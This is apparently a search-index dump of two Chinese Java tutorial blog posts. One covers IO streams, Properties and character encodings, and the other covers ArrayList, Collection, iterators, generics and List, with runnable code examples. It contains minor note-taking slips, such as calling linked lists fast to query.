ois.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:10:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"序列化中的serialVersionUID号 参考：java对象的序列化和反序列化详细解释 serialVersionUID是序列化前后的唯一标识符 中间发生了变化会导致对不上暗号，造成反序列化失败 默认如果没有人为显式定义过serialVersionUID，那编译器会为它自动声明一个 例如根据该类的各方面信息自动地为它生成一个默认的serialVersionUID 当序列化前后对类进行了修改，如增删了成员变量，会导致默认序列号的变化，导致对不上暗号 为了serialVersionUID的确定性，凡是implements Serializable的类，建议人为显式地为它声明一个serialVersionUID明确值 对类加实现implements Serializable之后eclipse会产生黄色感叹号，可以生成序列号 两种，一种是默认序列号，一种是生成一个序列号，建议用生成序列号 默认：private static final long serialVersionUID = 1L; 生成：private static final long serialVersionUID = 7578031297319648676L; ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:10:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:10:5","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"Properties ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:11:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"Properties概述 集合： Collections: 单列集合 Map: 双列集合 Properties：实现了Map集合 Properties：可以与IO流结合使用 Properties：实现了Map接口，父类是Hashtable Hashtable小番外： t应该大写，误写为小写了，但是版本太高了，将错就错使用小写沿用至今… Hashtable和HashMap: Hashtable是同步的，安全性高，效率低； HashMap是非同步的，安全性低，效率高 Properties类：属性列表 表示了一个持久的属性集。(不是临时写入，程序结束就消失那种，而是较持久地写入了文件或什么中) Properties 可保存在流中或从流中加载。 属性列表中每个键及其对应值都是一个字符串。 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:11:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"Properties的构造方法和简单应用 Properties的构造方法： Properties() 和 Properties(Properties defaults) 一般用空构造即可 简单应用：创建并遍历 步骤： 创建属性列表对象 添加映射关系 遍历属性列表 注：Properties也有相关的特有方法，不过用Map继承的方法也足够用了 代码示例： import java.util.Map; import java.util.Properties; import java.util.Set; public class PropertiesDemo { public static void main(String[] args) { //创建属性列表对象 Properties prop = new Properties(); //添加映射关系: 使用Map的赋值方法 prop.put(\"ID001\", \"zhangsan\"); prop.put(\"ID002\", \"lisi\"); prop.put(\"ID003\", \"wangwu\"); //遍历属性列表 //方法1：获取所有的key, 通过key获取value Set\u003cObject\u003e keys = prop.keySet();//注意：Properties是String, 但现在使用Set的方法，泛型需要是Object类，下同 for (Object key : keys) {//同理，泛型需要是Object类 Object value = prop.get(key); System.out.println(key + \"---\" + value); } //方法2：获取所有的映射关系对象 Set\u003cMap.Entry\u003cObject, Object\u003e\u003e entrys = prop.entrySet(); for (Map.Entry\u003cObject, Object\u003e entry : entrys) { Object key = entry.getKey(); Object value = entry.getValue(); System.out.println(key + \"---\" + value); } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:11:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"Properties与IO流结合的功能 void list(PrintWriter out) 将属性列表输出到指定的输出流。 步骤： 创建属性列表对象 添加映射关系 创建打印流对象 使用list()方法 释放资源 代码示例： import java.io.IOException; import java.io.PrintWriter; import java.util.Properties; public class PropertiesDemo { public static void main(String[] args) throws IOException { //创建属性列表对象 Properties prop = new Properties(); //添加映射关系: 使用Properties自己的赋值方法 prop.setProperty(\"ID001\", \"zhangsan\");//setProperty输入的是字符串对象 prop.setProperty(\"ID002\", \"lisi\"); prop.setProperty(\"ID003\", \"wangwu\"); //创建打印流对象 PrintWriter out = new PrintWriter(\"a.txt\"); prop.list(out); /* a.txt文件： -- listing properties -- ID001=zhangsan ID002=lisi ID003=wangwu * */ //释放资源 out.close(); } } void load(Reader reader): 按简单的面向行的格式从输入字符流中读取属性列表（键和元素对） 步骤： 创建属性列表对象 创建输入流对象 使用load()方法 释放资源 在上一步已经写入文件的基础上，可以用load方法进行加载，并输出 代码示例： public static void main(String[] args) throws IOException { //创建属性列表对象 Properties prop = new Properties(); //创建一个输入流对象 FileReader fr = new FileReader(\"a.txt\"); //load()方法 prop.load(fr); //释放资源 fr.close(); System.out.println(prop);//{--=listing properties --, ID001=zhangsan, ID002=lisi, ID003=wangwu} } void store(Writer writer, String comments): 以适合使用 load(Reader) 方法的格式，将此 Properties 表中的属性列表（键和元素对）写入输出字符 comments: 会以comments描述的方式在第一行显示 步骤： 创建属性列表对象 添加映射关系 创建输出流对象 使用store()方法 释放资源 代码示例： public static void main(String[] args) throws IOException { //创建属性列表对象 Properties prop = new Properties(); //添加映射关系: 使用Properties自己的赋值方法 prop.setProperty(\"ID001\", \"zhangsan\"); prop.setProperty(\"ID002\", \"lisi\"); prop.setProperty(\"ID003\", \"wangwu\"); //创建输出流对象 FileWriter fw = new FileWriter(\"b.txt\"); prop.store(fw, \"hello world\"); /* b.txt: * #hello world #Sat May 28 18:29:16 CST 2022 ID001=zhangsan ID002=lisi ID003=wangwu * */ //释放资源 fw.close(); } list()和store()的区别： list只能接受打印流 store()可以接收任意输出流 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:11:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:11:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"编码表 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:12:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"编码表概述 编码表： 计算机底层：都是二进制数据 编码表：把计算机底层的二进制数据转换成我们能看懂的字符 编码表进化史简介： ASCII: 最初的编码表，包含有限的编码 (一些符号数字和字母，类似a-97) GB2312：中文最初的编码表，且完全包含了ASCII表 GBK：中文进化的编码表 并且各种语言都进化出自己的编码表 Unicode: 整合大部分国家语言的编码表，所有字符都占2字节 Java中字符的默认码表就是Unicode UTF-8: 针对Unicode的字节位浪费，进化出长度可变的编码表 更灵活，节省了空间 ANSI：本地编码表，根据本机语言设置选择编码表 如计算机的语言是简体中文，则码表为GBK ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:12:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"Java中字符串的编码 Java中字符串默认使用的是ANSI(GBK) 注：Mac默认文件编码方式是UTF-8，且没有ANSI或GBK 乱码： 编码方式前后不一致导致，改为前后一致即可解决 如果修改了文件中的默认编码方式，则在读写过程中，可以指定其他编码方式 文件 – 右键 – 属性：可以查看或修改编码方式 写入数据指定编码方式 Sting的方法：byte[] getBytes(): 空参数，通过默认编码转换为数组，并将结果存储到一个新的 byte 数组中。 Sting的方法：byte[] getBytes(String charsetName): 使用指定的编码方式将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。 代码示例： import java.io.FileOutputStream; import java.io.IOException; public class EncoderDemo { public static void main(String[] args) throws IOException { String s = \"高薪就业\"; //byte[] bys = s.getBytes();//通过默认编码方式转为数组 byte[] bys = s.getBytes(\"UTF-16\");//指定文件编码方式 FileOutputStream fos = new FileOutputStream(\"a.txt\"); fos.write(bys); fos.close(); } } 读取数据指定编码方式： String(byte[] bytes, int offset, int length, String charsetName): 通过使用指定的字符集解码指定的 byte 子数组，构造一个新的 String。 代码示例： public static void main(String[] args) throws IOException { FileInputStream fis = new FileInputStream(\"a.txt\"); byte[] bys = new byte[1024]; int len = fis.read(bys); System.out.println(new String(bys,0,len,\"UTF-16\"));//高薪就业 } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:12:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"字符流中的编码 核心思想： 字符流 = 字节流 + 编码 遇到编码不一致问题，有以下两种解决思路 法1：用上面的老方法，String转为数组时标记编码方式，然后写入时new String并传入该数组 注：Mac系统,转换后仍然乱码，不明原因 代码示例： public class EncoderDemo { public static void main(String[] args) throws IOException { FileWriter fw = new FileWriter(\"a.txt\"); String s = \"高薪就业\"; byte[] bys = s.getBytes(\"UTF-16\"); fw.write(new String(bys));//仍然是乱码，未解决 fw.close(); } } 法2：探索底层，底层来看，字符流到底还是需要转为字节，查看源码也可得，在输入流部分做功课 FileWriter的父类是OutputStreamWriter OutputStreamWriter: 转换流，字符流通向字节流的桥梁 构造时：空参数表示默认编码，传入指定编码方式可以用其他编码方式进行编码 OutputStreamWriter(OutputStream out, String charsetName) 代码示例： public class EncoderDemo { public static void main(String[] args) throws IOException { OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"a.txt\"), \"UTF-16\"); String s = \"月薪过万\"; osw.write(s);//可，写入文件的是s的内容 osw.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:12:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:12:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"END ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:12:5","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"目录 ArrayList: 集合类, ArrayList, 构造方法, 添加方法, 增删改查方法, 集合遍历 集合类: 集合类的体系结构, Collection常用功能, 迭代器与并发修改异常, 泛型, foreach循环 常见数据结构: 数组, 链表, 栈和队列的简单图解 List: List概述, List的特有功能, List的子类(ArrayList和LinkedList), 源码阅读tips Set: Set接口的特点, HashSet的add()方法以及hashCode()和equals()方法的重写 Collections工具类: Collection和Collections的区别(面试题), Collections的常用方法, 模拟斗地主发牌小题 Map: Map接口概述, Map的功能, Map的两种遍历方法, HashMap存储对象并遍历(自定义对象为key时重写两个方法) ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:0:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"ArrayList ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"备注 此部分在“Java常用API”系列中首次出现，这里直接复制并简化了相关内容。 详见：Java常用API: 集合类与ArrayList ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"集合类概述 引入 面向对象语言对事物的描述是通过对象体现的; 为了方便对多个对象进行操作，必须把这多个对象进行存储。 而要想存储多个对象，就不能是一个基本的变量，而应该是一个容器类型的变量。 已经学过的，有哪些是容器类型的呢? 数组和StringBuilder StringBuilder的结果是一个字符串，不一定满足我们的要求， 所以我们只能选择数组，这就是对象数组。 对象数组的弊端：不能适应变化的需求，因为数组的长度是固定的 因此：为了适应变化的需求，Java就提供了 \u003c集合类\u003e 供我们使用。 集合类的特点： 长度可变 (相比数组的优势) ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"ArrayList概述 最常用的集合，通过阅读API学习 java.util包下：因此需要导包 import java.util.ArrayList; ArrayList\u003cE\u003e：大小可变数组的实现。 \u003cE\u003e：一种特殊的数据类型，泛型。 在出现E的地方，暂时可以使用引用数据类型替换。 举例：ArrayList\u003cString\u003e, ArrayList\u003cStudent\u003e, … 打印自带小括号：syso输出 ‘array：[hello, world]’ ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"构造方法 无参：ArrayList() 示例：ArrayList\u003cString\u003e array = new ArrayList\u003cString\u003e();//可以参考数组的定义格式 无参：ArrayList()： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:4","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"添加元素 public boolean add(E e): 依次添加元素，E根据定义的类型确定，用的多 示例：array.add(\"hello\"); //这条可作为一行独立代码 public void add(int index, E element): 在指定索引处添加元素，而原位置元素顺次后移一位，用的不多 示例：array.add(1, \"java\");//原来索引1处的元素会顺次后移到索引2处 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:5","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"增删改查 获取元素： public E get(int index): 返回指定索引处的元素 注意：get方法不改变原有集合 示例：System.out.println(\"get:\"+array.get(0)); 集合长度： public int size(): 返回集合中的元素的个数 示例：System.out.println(\"size:\"+array.size()); 删除元素： public boolean remove(Object o): 删除指定的元素，并返回删除是否成功（布尔型） 注意：若存在，即可删除并返回true，否则返回false；成功时仅删除第一个，再次remove时删除下一个该元素。 示例：array.remove(\"hello\"); public E remove(int index): 删除指定索引处的元素，并返回被删除的元素 注意：输入的是索引值，需要注意越界错误 示例：System.out.println(\"remove(index)\": + array.remove(i)); 修改元素： public E set(int index, E element) – 修改指定索引处的元素，返回被修改的元素（原来的元素） 示例：System.out.println(\"set:\"+array.set(1,\"python\")); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:6","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"集合遍历 用for循环 + size()方法 + get()方法 注：常规的做法是，输出时，先将get获取到的元素存储在变量中，然后输出变量。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:7","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:1:8","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"集合类 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"集合类的体系结构 体系结构: 怎么学习？ 从最顶层开始学习，因为最顶层包含了所有的共性。 怎么使用？ 使用最底层，因为最底层就是具体的实现。 集合的体系结构： 由于不同的数据结构(数据的组织、存储方式)，所以Java为我们提供了不同的集合。 不同的集合功能相似，不断向上提取，将共性抽取出来，就是集合体系结构的原因。 ArrayList –\u003e List –\u003e Collection Collection: 最顶层 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Collection常用功能 Collection: java.util包下 接口，不能实例化 – 用子类创建(多态) 示例：Collection c = new ArrayList();//多态,父类引用指向子类对象 boolean add(E e)：添加元素e，返回是否添加成功 ArrayList: 允许重复，返回值恒为true 示例：c.add(\"hello\"); 可以直接输出；可赋值给Boolean类型的变量 void clear(): 清空集合 会清空集合中所有元素，慎用 示例：c.clear(); boolean contains(Object o): 判断集合中是否包含指定元素 示例：syso(c.contains(\"hello\"));//true boolean isEmpty()：判断集合是否为空 示例：syso(c.isEmpty());//false 注：c.clear(); 后会判空为true boolean remove(Object o): 删除元素，返回删除成功与否 示例：syso(c.remove(\"Java\"));//删除没有的元素，返回false int size(): 返回集合中的元素个数 求集合对象的个数或长度： 注意与 数组length属性 和 String的length()方法区分。 示例：syso(c.size()); Object toArray(): 将集合转换为Object类型的数组 Object类型：任意类型的父类型，确保涵盖所有类型的元素。 使用场景：用数组思路遍历集合时可以先转为数组类型 示例：Object[] objs = c.toArray();//转为Object类型的数组后遍历 迭代器：Iterator\u003cE\u003e iterator() 下一小节详述 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"迭代器与并发修改异常 集合的遍历方式： 法1：toArray() 把集合转为数组，然后以数组的方式遍历 局限性：不是所有集合都与索引相关 法2：Iterator\u003cE\u003e iterator(): 返回一个迭代器对象，通过迭代器对象来迭代集合 后面还有一个foreach循环方法 迭代器： Iterator\u003cE\u003e iterator(): 注意区别前后两个迭代器 iterator(): 是Collection类的一个方法 Iterator接口：是一个接口 Collection对象的这个iterator()方法的作用就是返回一个迭代器对象，因此可以通过此方法获取迭代器对象。 Iterator接口： 用于遍历集合 有三种方法：hasNext(), next(), remove() 获取迭代器方法： 由Collection对象的iterator()方法获取 代码示例：Iterator it = c.iterator(); E next()方法： 返回下一个元素 没有下一个元素时报错： 抛出异常：Exception in thread “main” java.util.NoSuchElementException 代码示例：syso(it.next());//返回获取到的元素，或者报错 boolean hasNext(): 判断是否有下一个元素可以获取，有则返回true，否则false 代码示例： import java.util.ArrayList; import java.util.Collection; import java.util.Iterator; public class IteratorDemo { public static void main(String[] args) { Collection c = new ArrayList(); c.add(\"hello\"); c.add(\"world\"); c.add(\"java\"); Iterator it = c.iterator(); while(it.hasNext()) { System.out.println(it.next()); } System.out.println(it.next());//java.util.NoSuchElementException } } 并发修改异常 并发修改异常： ConcurrentModificationException 异常分析： 迭代器是依赖于集合的，相当于集合的一个副本； 当迭代器操作时，如果发现和集合不一样，会抛出异常。 迭代中途给集合添加元素触发了“不一样” 异常代码示例： import java.util.ArrayList; import java.util.Collection; import java.util.Iterator; public class IteratorDemo { public static void main(String[] args) { Collection c = new ArrayList(); c.add(\"hello\"); c.add(\"world\"); c.add(\"java\"); Iterator it = c.iterator(); while(it.hasNext()) { String s = (String)it.next(); if(s.equals(\"java\")) c.add(\"android\");//java.util.ConcurrentModificationException } } } 使用ListIterator解决 让迭代器去添加或修改，会同步到集合中，这样就不会触发并发修改异常 在Iterator接口中没有发现add相关方法，找Iterator的子接口ListIterator中找到add()方法 ListIterator创建：ListIterator\u003cE\u003e listIterator() 返回此列表元素的列表迭代器（按适当顺序）。 综上： 创建集合部分，用List代替Collection； 创建迭代器部分，用list.listIterator()方法； 添加元素部分：用ListIterator迭代器的add()方法 改进后的代码示例： import java.util.ArrayList; import java.util.List; import java.util.ListIterator; public class IteratorDemo { public static void main(String[] args) { //Collection c = new ArrayList(); List c = new ArrayList();//也可以ArrayList代替List c.add(\"hello\"); c.add(\"world\"); c.add(\"java\"); //Iterator it = c.iterator(); ListIterator lit = c.listIterator(); while(lit.hasNext()) { String s = (String)lit.next(); if(s.equals(\"java\")) //c.add(\"android\");//java.util.ConcurrentModificationException lit.add(\"android\");//不要用集合添加，而是使用迭代器添加，迭代器会同步到集合 } System.out.println(c);//[hello, world, java, android] } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"泛型 泛型概述： 引入： 集合可以存储任意类型的数据 当存储了不同类型的数据，就有可能在转换的时候发生类型转换异常 ClassCastException java为了解决这个问题，就引入了一种机制，即泛型。 概述： 一种广泛的类型 把明确数据类型的工作提前到了编译时期 借鉴了数组的特点 好处： 避免了数据类型转换异常的发生； 减少了编辑器里的黄色警告标识； 简化了代码的书写 泛型使用： 查阅API/Ctrl查看源码，当看到类或接口有\u003cE\u003e，就可以使用泛型。 可以标明泛型而没有写，编辑器会给黄色警告线 注意：\u003cE\u003e中的E在实际代码中需要替换为具体的对象类型 示例： Collection\u003cStudent\u003e c = new ArrayList\u003cStudent\u003e();//声明集合c总存储的对象类型为Student Iterator\u003cStudent\u003e it = c.iterator(); 代码示例： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:4","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"foreach循环 foreach: 增强for循环，一般用于遍历集合或数组 格式： 每次循环，将 (冒号后的)集合或数组对象中的一个元素 放入 (冒号前的)定义为元素类型的变量中，并在循环中使用取出的变量 for(元素的类型 变量 : 集合或者数组对象){ 可以直接使用变量; } 注意： 增强for循环提供了一种新的遍历集合的方法。 增强for循环中不能修改集合，否则会出现并发修改异常。 增强for循环底层是迭代器循环(上一条的原因) Collection 的父接口 Iterator： 其中有一条说明：public interface Iterable\u003cT\u003e 实现这个接口允许对象成为 “foreach” 语句的目标。 代码示例： import java.util.ArrayList; import java.util.Collection; import java.util.List; import java.util.ListIterator; public class IteratorDemo { public static void main(String[] args) { Collection\u003cString\u003e c = new ArrayList\u003cString\u003e(); c.add(\"hello\"); c.add(\"world\"); c.add(\"java\"); for (String string : c) { System.out.println(string); } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:5","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:2:6","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"常见数据结构 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:3:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"数组 查找快，增删慢 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:3:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"链表 查询快，增删慢 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:3:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"栈和队列 栈：先进后出 队列：先进先出 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:3:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:3:4","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"List ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"List概述 List接口： 有序的 collection（也称为序列）。 此接口的用户可以对列表中每个元素的插入位置进行精确地控制。 用户可以根据元素的整数索引（在列表中的位置）访问元素，并搜索列表中的元素。 List特点： 有序的(存储和读取的顺序是一样的); 有整数索引； 允许重复。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"List的特有功能 针对Collection父类的特有功能，集中体现为索引值相关的增删改查 创建可用的List对象： 示例：List list = new ArrayList(); 注意： 涉及到索引值，需要注意越界异常 java.lang.IndexOutOfBoundsException void add(int index, E element): 在指定索引位置添加指定元素 指定索引位置已有元素时，会将已有元素向 索引值+1 的位置移动一位，将新元素放在指定索引位置。 示例：list.add(1,\"hello\"); E get(int index): 根据索引返回元素 需要注意越界异常 示例：System.out.println(list.get(1)); E remove(int index): 删除指定元素并返回 注意越界异常 示例：System.out.println(list.remove(1));//删除索引1处的元素，并将这个被删除的元素返回 E set(int index, E element): 将指定索引位置的元素替换为新的指定元素，并将原来的元素返回 示例：System.out.println(list.set(0,\"android\"));//返回值为原索引0处的元素 代码示例： import java.util.ArrayList; import java.util.List; public class ListDemo { public static void main(String[] args) { List list = new ArrayList(); list.add(0, \"hello\"); list.add(0, 